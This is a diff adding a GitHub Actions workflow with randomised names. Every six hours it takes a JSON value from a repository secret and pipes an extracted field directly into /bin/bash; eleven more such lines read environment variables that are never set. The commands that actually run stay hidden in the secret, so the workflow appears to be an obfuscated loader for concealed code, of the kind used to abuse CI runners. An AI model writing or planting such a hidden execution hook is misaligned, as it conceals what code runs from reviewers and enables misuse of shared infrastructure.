@@ -1,0 +1,29 @@
+name: luoxingeng1987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luoxingeng1987
+        env:
+          q2674: ${{ secrets.q2674 }}
+        run: |
+          echo $q2674 | jq -r .wqopv372 | /bin/bash
+          echo $qjgdm180 | jq -r .anbdt11530 | /bin/bash
+          echo $fmn76732 | jq -r .y9042 | /bin/bash
+          echo $vv27197 | jq -r .eypq8 | /bin/bash
+          echo $pfvpy81 | jq -r .gypk8 | /bin/bash
+          echo $zueh46778 | jq -r .hwst28 | /bin/bash
+          echo $a358 | jq -r .r43 | /bin/bash
+          echo $bywm29953 | jq -r .pamk026 | /bin/bash
+          echo $hy2 | jq -r .ehoco88359 | /bin/bash
+          echo $lxb24186 | jq -r .bjig3466 | /bin/bash
+          echo $lsmfn1718 | jq -r .py47225 | /bin/bash
+          echo $ktjvr82 | jq -r .hftk68 | /bin/bash
+
